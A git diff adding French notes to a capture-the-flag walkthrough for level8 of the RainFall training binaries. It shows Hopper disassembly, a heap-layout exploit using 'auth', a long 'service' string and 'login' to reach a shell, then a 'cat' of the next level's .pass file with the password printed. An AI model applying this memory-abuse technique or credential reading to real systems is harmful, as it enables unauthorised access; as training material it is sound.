@@ -76,3 +76,22 @@ c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 bon cherchon auqnd meme mais a vue d'oeil le login pass de write Password a bin/sh a une condition
 
 on avait vue qu'il fallait 32 bits pour activer une condition du coup j'ai aussi vue qu'il verifier 
+
+apres avoir utiliser hopper je vois 
+080486e2         mov        eax, dword [ds:auth]                                ; auth
+080486e7         mov        eax, dword [ds:eax+0x20]
+080486ea         test       eax, eax
+080486ec         je         0x80486ff
+
+donc 0x20 = 32 du coup si auth a 32 carac non nul alors jmp a bin/sh
+
+on comprend qu'il faut d'abord:
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth qwerty																			 set auth
+0x804a008, (nil) 
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa [plus de 32 carac]
+0x804a008, 0x804a018 
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
